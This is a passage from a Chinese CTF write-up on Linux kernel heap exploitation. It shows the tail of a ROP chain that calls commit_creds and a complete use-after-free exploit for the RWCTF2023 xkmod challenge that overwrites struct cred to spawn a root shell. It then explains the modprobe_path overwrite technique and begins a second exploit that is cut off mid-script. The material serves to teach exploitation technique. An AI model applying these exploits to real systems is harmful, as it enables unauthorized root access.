class="hljs-string">&quot;peiwhhao&quot;</span>;<br>  buf[<span class="hljs-number">6</span>] = *(<span class="hljs-type">size_t</span>*)<span class="hljs-string">&quot;peiwhhao&quot;</span>;<br>  buf[<span class="hljs-number">7</span>] = POP_RDI_RET + kernel_offset;<br>  buf[<span class="hljs-number">8</span>] = <span class="hljs-literal">NULL</span>;<br>  buf[<span class="hljs-number">9</span>] = prepare_kernel_cred + kernel_offset;<br>  buf[<span class="hljs-number">10</span>] = XCHG_RDI_RAX_DEC_RET + kernel_offset;<br>  buf[<span class="hljs-number">11</span>] = commit_creds + kernel_offset;<br>  buf[<span class="hljs-number">12</span>] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMDOE + kernel_offset + <span class="hljs-number">0x31</span>;<br>  buf[<span class="hljs-number">13</span>] = *(<span class="hljs-type">size_t</span>*)<span class="hljs-string">&quot;peiwhhao&quot;</span>;<br>  buf[<span class="hljs-number">14</span>] = *(<span class="hljs-type">size_t</span>*)<span class="hljs-string">&quot;peiwhhao&quot;</span>;<br>  buf[<span class="hljs-number">15</span>] = (<span class="hljs-type">size_t</span>*)get_root;<br>  buf[<span class="hljs-number">16</span>] = user_cs;<br>  buf[<span class="hljs-number">17</span>] = user_rflags;<br>  buf[<span class="hljs-number">18</span>] = user_sp + <span class="hljs-number">8</span>;<br>  buf[<span class="hljs-number">19</span>] = user_ss;<br><br>  <br>  my_delete(<span class="hljs-number">0</span>);<br>  my_alloc(<span class="hljs-number">0</span>, PIPE_BUFFER_SZ, buf);<br><br>  close(pipe_fd[<span class="hljs-number">0</span>]);<br>  close(pipe_fd[<span class="hljs-number">1</span>]);<br>&#125;<br></code></pre></td></tr></table></figure>

<h1 id="六、Kernel-Heap-Arbitrary-Write-x2F-Read"><a href="#六、Kernel-Heap-Arbitrary-Write-x2F-Read" class="headerlink" title="六、Kernel Heap - Arbitrary Write&#x2F;Read"></a>六、Kernel Heap - Arbitrary Write&#x2F;Read</h1><h2 id="例题：RWCTF2023体验赛-Digging-into-kernel-2"><a href="#例题：RWCTF2023体验赛-Digging-into-kernel-2" class="headerlink" title="例题：RWCTF2023体验赛-Digging into kernel 2"></a>例题：RWCTF2023体验赛-Digging into kernel 2</h2><h3 id="1-题目逆向-3"><a href="#1-题目逆向-3" class="headerlink" title="1. 题目逆向"></a>1. 题目逆向</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">xkmod_init</span><span class="hljs-params">()</span><br>&#123;<br>  kmem_cache *v0; <span class="hljs-comment">// rax</span><br><br>  printk(&amp;unk_1E4);<br>  misc_register(&amp;xkmod_device);<br>  v0 = (kmem_cache *)kmem_cache_create(<span class="hljs-string">&quot;lalala&quot;</span>, <span class="hljs-number">192LL</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>);<br>  buf = <span class="hljs-number">0LL</span>;<br>  s = v0;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>在模块初始化的时候注册了一个misc设备，然后构造一个属于自己的kmem_cache，但是由于他并没有设置其他额外的flags，所以由于kmalloc alias机制，会导致该kmem_cache会同我们内核当中的kmalloc-192一起复用，可能这并不是出题者的本意</p>
<p>漏洞点为关闭设备时执行的代码，存在UAF</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">xkmod_release</span><span class="hljs-params">(inode *inode, file *file)</span><br>&#123;<br>  <span class="hljs-keyword">return</span> kmem_cache_free(s, buf);<br>&#125;<br></code></pre></td></tr></table></figure>



<h3 id="2-easy-mode"><a href="#2-easy-mode" class="headerlink" title="2. easy mode"></a>2. easy mode</h3><p>首先咱们就利用出题者的失误来打一个较为简单的kernel pwn，这里给出以下思路</p>
<ol>
<li>首先打开多个漏洞设备，咱们设备中的buf都指向内核的bss段</li>
<li>然后我们关闭其中一个漏洞设备，但是其中在xkmod_release的过程当中并没有给我们的buf置空，造成了悬垂指针</li>
<li>此时buf指向的堆块处于freelist当中，此时若我们再次分配一个192大小的结构体，那么就会将其分配出去</li>
<li>我们选用大小刚刚适合的<code>struct cred</code>，然后我们利用ioctl系统调用当中的不同选项来将本进程的uid、gid什么的改0即可</li>
</ol>
<p>exp如下：</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mount.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ipc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/msg.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">user_arg</span>&#123;<br>    <span class="hljs-type">void</span> *buffer;<br>    <span class="hljs-type">int</span> offset, size;<br>&#125;data;<br><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">alloc_kernelmem</span><span class="hljs-params">(<span class="hljs-type">int</span> dev_fd)</span></span>&#123;<br>    <span class="hljs-built_in">ioctl</span>(dev_fd, <span class="hljs-number">0x1111111</span>, &amp;data);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">get_kernelmsg</span><span class="hljs-params">(<span class="hljs-type">int</span> dev_fd)</span></span>&#123;<br>    <span class="hljs-built_in">ioctl</span>(dev_fd, <span class="hljs-number">0x7777777</span>, &amp;data);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">put_usermsg</span><span class="hljs-params">(<span class="hljs-type">int</span> dev_fd)</span></span>&#123;<br>    <span class="hljs-built_in">ioctl</span>(dev_fd, <span class="hljs-number">0x6666666</span>, &amp;data);<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-type">int</span> dev_fd[<span class="hljs-number">2</span>];<br>    <span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x1000</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">size_t</span> length = <span class="hljs-number">0x50</span>;<br>    data.buffer = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    data.offset = <span class="hljs-number">0</span>;<br>    data.size = <span class="hljs-number">0x50</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">2</span>; i++)&#123;<br>        dev_fd[i] = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/dev/xkmod&quot;</span>, O_RDONLY);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;step1\n&quot;</span>);<br>    <span class="hljs-built_in">alloc_kernelmem</span>(dev_fd[<span class="hljs-number">0</span>]);<br>    <span class="hljs-built_in">close</span>(dev_fd[<span class="hljs-number">0</span>]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;step2:\n&quot;</span>);<br>    <span class="hljs-type">int</span> pid = fork();<br>    <span class="hljs-keyword">if</span>(!pid)&#123;   <span class="hljs-comment">//child process</span><br>        <span class="hljs-built_in">get_kernelmsg</span>(dev_fd[<span class="hljs-number">1</span>]);<br>        <span class="hljs-keyword">if</span>(((<span class="hljs-type">int</span> *)data.buffer)[<span class="hljs-number">3</span>] == <span class="hljs-number">0x3e8</span>)&#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++)&#123;<br>                ((<span class="hljs-type">int</span> *)data.buffer)[i] = <span class="hljs-number">0</span>;<br>            &#125;<br>            <span class="hljs-built_in">put_usermsg</span>(dev_fd[<span class="hljs-number">1</span>]);<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">getuid</span>())&#123;<br>                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+]Get Root Priviledge!&quot;</span>);<br>                <span class="hljs-built_in">setresuid</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>                <span class="hljs-built_in">setresgid</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>                <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">wait</span>();<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p><img src="http://imgsrc.baidu.com/forum/pic/item/3812b31bb051f81935f124799cb44aed2e73e729.jpg" srcset="/img/loading.gif" lazyload></p>
<h3 id="3-normal-mode"><a href="#3-normal-mode" class="headerlink" title="3. normal mode"></a>3. normal mode</h3><p>我们在easy mode当中已经实现了UAFobj的读取，我们可以查看以下读取的UAF内容来查看改出题人构造的<code>kmem_cache</code>中offset的值，在测试的过程中我们可以看到一般读取的UAF块其中头8字节都是我们的一个kernel heap地址，因此我们可以推测其中每个空闲object的下一块链接指针在偏移为0处</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/0df3d7ca7bcb0a461389a20a2d63f6246b60af5e.jpg" srcset="/img/loading.gif" lazyload></p>
<p>而在学习<a target="_blank" rel="noopener" href="https://arttnba3.cn/">arttnba3师傅</a>的博客途中发现其中记录了两种内核配置的保护手段，如下：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">config SLAB_FREELIST_RANDOM<br>	<span class="hljs-type">bool</span> &quot;Randomize slab freelist&quot;<br>	<span class="hljs-keyword">depends</span> <span class="hljs-keyword">on</span> SLAB || SLUB<br>	help<br>	  Randomizes the freelist <span class="hljs-keyword">order</span> used <span class="hljs-keyword">on</span> creating <span class="hljs-built_in">new</span> pages. This<br>	  <span class="hljs-keyword">security</span> feature reduces the predictability <span class="hljs-keyword">of</span> the kernel slab<br>	  allocator against heap overflows.<br><br>config SLAB_FREELIST_HARDENED<br>	<span class="hljs-type">bool</span> &quot;Harden slab freelist metadata&quot;<br>	<span class="hljs-keyword">depends</span> <span class="hljs-keyword">on</span> SLUB<br>	help<br>	  Many kernel heap attacks try <span class="hljs-keyword">to</span> target slab <span class="hljs-keyword">cache</span> metadata and<br>	  other infrastructure. This options makes minor performance<br>	  sacrifices to harden the kernel slab allocator against common<br>	  freelist exploit methods.<br></code></pre></td></tr></table></figure>

<p>其中第一种是在我们创建新的pages页面的时候其中会打乱我们freelist的顺序，也就是一开始是乱序的。</p>
<p>其二若是在kernel中配置了Y，那么就会在<code>kmem_cache</code>中添加一个额外的字段<code>random_seq</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Slab cache management.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache</span> &#123;</span><br>	...<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLAB_FREELIST_RANDOM</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *random_seq;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>	...<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_node</span> *<span class="hljs-title">node</span>[<span class="hljs-title">MAX_NUMNODES</span>];</span><br>&#125;;<br><br></code></pre></td></tr></table></figure>

<p>他的作用我感觉同glibc中safe unlink 类似，都是在指向下一个指针的地址异或上一个值，而这里的特殊值就是<code>random_seq</code></p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Returns freelist pointer (ptr). With hardening, this is obfuscated</span><br><span class="hljs-comment"> * with an XOR of the address where the pointer is held and a per-cache</span><br><span class="hljs-comment"> * random number.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> *<span class="hljs-title">freelist_ptr</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">void</span> *ptr,</span></span><br><span class="hljs-params"><span class="hljs-function">				 <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ptr_addr)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * When CONFIG_KASAN_SW/HW_TAGS is enabled, ptr_addr might be tagged.</span><br><span class="hljs-comment">	 * Normally, this doesn&#x27;t cause any issues, as both set_freepointer()</span><br><span class="hljs-comment">	 * and get_freepointer() are called with a pointer with the same tag.</span><br><span class="hljs-comment">	 * However, there are some issues with CONFIG_SLUB_DEBUG code. For</span><br><span class="hljs-comment">	 * example, when __free_slub() iterates over objects in a cache, it</span><br><span class="hljs-comment">	 * passes untagged pointers to check_object(). check_object() in turns</span><br><span class="hljs-comment">	 * calls get_freepointer() with an untagged pointer, which causes the</span><br><span class="hljs-comment">	 * freepointer to be restored incorrectly.</span><br><span class="hljs-comment">	 */</span><br>	<span class="hljs-keyword">return</span> (<span class="hljs-type">void</span> *)((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)ptr ^ s-&gt;random ^<br>			<span class="hljs-built_in">swab</span>((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)<span class="hljs-built_in">kasan_reset_tag</span>((<span class="hljs-type">void</span> *)ptr_addr)));<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>	<span class="hljs-keyword">return</span> ptr;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;<br></code></pre></td></tr></table></figure>

<p>上面代码可以看到在获取freelist指针的时候会异或一个随机值跟本身的地址，在本题的测试当中看不出来异或的痕迹，</p>
<p>所以说判断题目中关于以上两个保护措施的配置为</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">CONFIG_SLAB_FREELIST_HARDENED</span> = <span class="hljs-string">&#x27;n&#x27;</span><br><span class="hljs-attr">CONFIG_SLAB_FREELIST_RANDOM</span>   = <span class="hljs-string">&#x27;y&#x27;</span><br></code></pre></td></tr></table></figure>

<p>且其中next指针在object中的偏移为0，</p>
<p>而因为我们知道了一个堆地址，所以我们可以推测一下kernel heap的堆起始地址，然后又因为KASLR的粒度为256MB在<code>page_offset_base + 0x9d000</code>的地址里存放着我们的一个内核函数<code>secondary_startup_64</code>的地址，而该函数对于内核基地址始终差0x30字节，因此我们也可以通过该值来检测我们的内核基地址猜测是否正确</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/b17eca8065380cd796bf8bdee744ad345982815b.jpg" srcset="/img/loading.gif" lazyload></p>
<p>知道内核基地址实际上我们就可以利用<code>Arbitrary write</code>来构成任意写，那么具体该写哪儿呢？</p>
<p>这里引入一种提权手法那就是覆写<code>modeprobe_path</code>，这里的地址可以通过一点小技巧来查看</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">	modprobe_path is set via /proc/sys.</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">char</span> modprobe_path[KMOD_PATH_LEN] = CONFIG_MODPROBE_PATH;<br></code></pre></td></tr></table></figure>

<p>我们可以在root用户下查看<code>/proc/sys/kernel/modprobe</code>来查看其默认值，但一般都是<code>/sbin/modprobe</code></p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/ # cat /</span>proc<span class="hljs-regexp">/sys/</span>kernel/modprobe   <br><span class="hljs-regexp">/sbin/m</span>odprobe                      <br></code></pre></td></tr></table></figure>

<p>那我们该如何找到modprobe_path的地址呢，我们通过源码可以看到，在调用<code>__request_module</code>函数的时候，</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-built_in">int</span> <span class="hljs-constructor">__request_module(<span class="hljs-params">bool</span> <span class="hljs-params">wait</span>, <span class="hljs-params">const</span> <span class="hljs-params">char</span> <span class="hljs-operator">*</span><span class="hljs-params">fmt</span>, <span class="hljs-operator">...</span>)</span><br>&#123;<span class="hljs-operator"></span><br><span class="hljs-operator">	...</span><br><span class="hljs-operator"></span><br><span class="hljs-operator">	</span><span class="hljs-keyword">if</span> (!modprobe_path<span class="hljs-literal">[<span class="hljs-number">0</span>]</span>)<br>		return -ENOENT;<span class="hljs-operator"></span><br><span class="hljs-operator"></span><br><span class="hljs-operator">	...</span><br><span class="hljs-operator"></span>&#125;<br></code></pre></td></tr></table></figure>

<p>这里我们可以查看以下其中的汇编</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs assembly">ffffffff8108c690 &lt;__request_module&gt;:                                                                     <br>ffffffff8108c690:   55                      push   rbp                                                   <br>ffffffff8108c691:   48 89 e5                mov    rbp,rsp                                               <br>ffffffff8108c694:   41 56                   push   r14                                                   <br>ffffffff8108c696:   41 55                   push   r13                                                   <br>ffffffff8108c698:   41 54                   push   r12                                                   <br>ffffffff8108c69a:   49 89 f4                mov    r12,rsi                                               <br>ffffffff8108c69d:   41 52                   push   r10                                                   <br>ffffffff8108c69f:   4c 8d 55 10             lea    r10,[rbp+0x10]                                        <br>ffffffff8108c6a3:   53                      push   rbx                                                   <br>ffffffff8108c6a4:   4d 89 d5                mov    r13,r10                                               <br>ffffffff8108c6a7:   89 fb                   mov    ebx,edi                                               <br>ffffffff8108c6a9:   48 81 ec b0 00 00 00    sub    rsp,0xb0                                              <br>ffffffff8108c6b0:   48 89 55 b8             mov    QWORD PTR [rbp-0x48],rdx                              <br>ffffffff8108c6b4:   48 89 4d c0             mov    QWORD PTR [rbp-0x40],rcx                              <br>ffffffff8108c6b8:   4c 89 45 c8             mov    QWORD PTR [rbp-0x38],r8                               <br>ffffffff8108c6bc:   4c 89 4d d0             mov    QWORD PTR [rbp-0x30],r9                               <br>ffffffff8108c6c0:   65 48 8b 04 25 28 00    mov    rax,QWORD PTR gs:0x28                                 <br>ffffffff8108c6c7:   00 00                                                                                <br>ffffffff8108c6c9:   48 89 45 a0             mov    QWORD PTR [rbp-0x60],rax                              <br>ffffffff8108c6cd:   31 c0                   xor    eax,eax                                               <br>ffffffff8108c6cf:   40 84 ff                test   dil,dil                                               <br>ffffffff8108c6d2:   0f 85 80 01 00 00       jne    ffffffff8108c858 &lt;__request_module+0x1c8&gt;             <br>ffffffff8108c6d8:   80 3d 21 80 3b 01 00    cmp    BYTE PTR [rip+0x13b8021],0x0       # ffffffff82444700<br><br></code></pre></td></tr></table></figure>

<p>最底下只有那么一个cmp指令，因此我们可以断定他就是我们<code>modprobe_path</code>的值，因此我们只需要利用其中任意写的漏洞修改他为一个我们想要执行的文件即可，当然，拥有root权限</p>
<p>下面就是本次的利用情况</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/f3d3572c11dfa9ec4c9e7e2424d0f703918fc155.jpg" srcset="/img/loading.gif" lazyload></p>
<p>exp如下：</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mount.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ipc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/msg.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> HOME_PATH <span class="hljs-string">&quot;/home/flag.sh&quot;</span></span><br><span class="hljs-type">char</span> userful_shell[] = <span class="hljs-string">&quot;#!/bin/sh\nchmod 777 